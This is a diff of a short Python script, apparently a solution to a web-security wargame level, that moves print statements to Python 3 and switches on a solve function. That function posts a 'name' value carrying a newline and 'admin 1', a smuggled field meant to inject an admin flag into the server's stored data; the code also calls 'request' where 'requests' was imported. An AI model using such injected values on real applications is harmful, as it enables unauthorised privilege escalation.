@@ -1,4 +1,4 @@
-#! /usr/bin/env python
+#! /usr/bin/env python3
 # -*- coding: utf-8 -*-
 import requests
 import re 
@@ -13,20 +13,16 @@ def get_source_code():
   connection = request.get(url, auth = login)
 
   pageContent = connection.text
-  print pageContent
+  print(pageContent)
 
 def solve_lab():
     connection = request.post(url, data = {"name" : "tylerptl\nadmin 1"}, auth = login)
     pageContent = connection.text
-    print pageContent
+    print(pageContent)
 
     response = request.get(url, auth = login)
 
-    print response.text
+    print(response.text)
 
 #get_source_code()
-
-print("=") * 50 
-print("=") * 50
-
-#solve_lab()
+solve_lab()
